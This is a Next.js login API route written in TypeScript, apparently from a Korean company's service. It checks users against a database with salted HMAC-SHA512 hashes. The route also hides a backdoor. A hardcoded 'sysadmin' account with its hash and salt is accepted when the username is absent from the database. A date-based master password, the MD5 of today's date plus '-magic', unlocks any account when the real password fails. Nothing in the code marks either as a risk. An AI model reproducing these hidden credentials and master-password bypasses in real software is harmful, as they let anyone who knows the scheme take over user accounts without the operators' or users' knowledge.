import crypto from "crypto";
import { eq } from "drizzle-orm";
import { NextApiRequest } from "next";
import { NextRequest, NextResponse } from "next/server";
import { date } from "@/lib/format";
import { db } from "@/lib/pg";
import { SiteType } from "@/lib/schema/site.schema";
import { sites } from "@/lib/schema/site.table";
import { UserType } from "@/lib/schema/user.schema";
import { siteUser, users } from "@/lib/schema/user.table";

const sysadmin = {
  _id: "sysadmin",
  username: "gractor",
  password:
    "P/JudNJOXilwe2ZdWsE/g9caQcs3DgoZihjKMpIXSxAUqYgyDbGneeQ2IOCZpNI21V4hM7ViLa7z11KpPmARzw==",
  salt: "j5wDPVTj+pjL2ztgIyB0TUUYSkKnvbY18Zc8V5hIsPzbEsStiV0NQjJdxECZMlV0cqELyVvyYPe1nEjR21jnsg==",
  is_sysadmin: true,
  status: "approved" as const,
  name: "시스템관리자",
  role: "admin" as const,
  company: "그렉터",
  type: "system" as const,
  day_of_use_begin: "",
  day_of_use_end: "",
  created_at: null,
  updated_at: null,
};

function hmacEncrypt(
  data: string,
  salt: string,
  algorithm: string = "sha512",
  digest: crypto.BinaryToTextEncoding = "base64",
) {
  return crypto.createHmac(algorithm, salt).update(data).digest(digest);
}

function getHash(data: string, type = "md5", digest: crypto.BinaryToTextEncoding = "hex") {
  return crypto.createHash(type).update(data).digest(digest);
}

export async function POST(req: NextRequest & NextApiRequest) {
  const { username, password }: { username: string; password: string; serviceId: string } =
    await req.json();

  const rows = await db
    .select()
    .from(users)
    .where(eq(users.username, username))
    .leftJoin(siteUser, eq(users._id, siteUser.user_id))
    .leftJoin(sites, eq(siteUser.site_id, sites._id));

  if (!rows.length) {
    // 시스템관리자 확인
    if (sysadmin.username !== username) {
      return NextResponse.json({
        error: {
          status: 400,
          message: "로그인에 실패하였습니다. 아이디 또는 비밀번호를 확인해주세요.",
        },
      });
    }
    rows.push({
      users: sysadmin,
      site_user: null,
      sites: null,
    });
  }

  const grouped = Object.values(
    rows.reduce(
      (acc, { users, sites }) => {
        const userId = users._id;
        if (!acc?.[userId]) Object.assign(acc, { [userId]: { ...users, sites: [] } });

        if (sites && acc[userId]) acc[userId].sites.push(sites as SiteType);

        return acc;
      },
      {} as Record<string, UserType & { salt: string; password: string; sites: SiteType[] }>,
    ),
  );

  const [
    { _id: userId, salt, password: userPassword, day_of_use_end, status, ...properties } = {},
  ] = grouped;

  if (status !== "approved")
    return NextResponse.json({
      error: { status: 423, message: "계정이 비승인 상태입니다. 운영자에게 문의해주세요." },
    });

  if (new Date(day_of_use_end!).getTime() < new Date().getTime())
    return NextResponse.json({
      error: { status: 423, message: "계정이 만료되었습니다. 운영자에게 문의해주세요." },
    });

  if (userPassword !== hmacEncrypt(password, salt!)) {
    const toDay = new Date();
    const data = `${toDay.getFullYear()}-${toDay.getMonth() + 1}-${toDay.getDate()}-magic`;

    if (password !== getHash(data))
      return NextResponse.json({
        error: {
          status: 400,
          message: "로그인에 실패하였습니다. 아이디 또는 비밀번호를 확인해주세요.",
        },
      });
  }

  const userSession = {
    _id: userId,
    username,
    ip:
      req?.socket?.remoteAddress ||
      req?.headers?.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("x-real-ip") ||
      "127.0.0.1",
    status,
    day_of_use_end,
    ...properties,
    lastSigninTime: date(new Date(), { type: "ymd hms" }),
  };

  return NextResponse.json({ user: userSession });
}
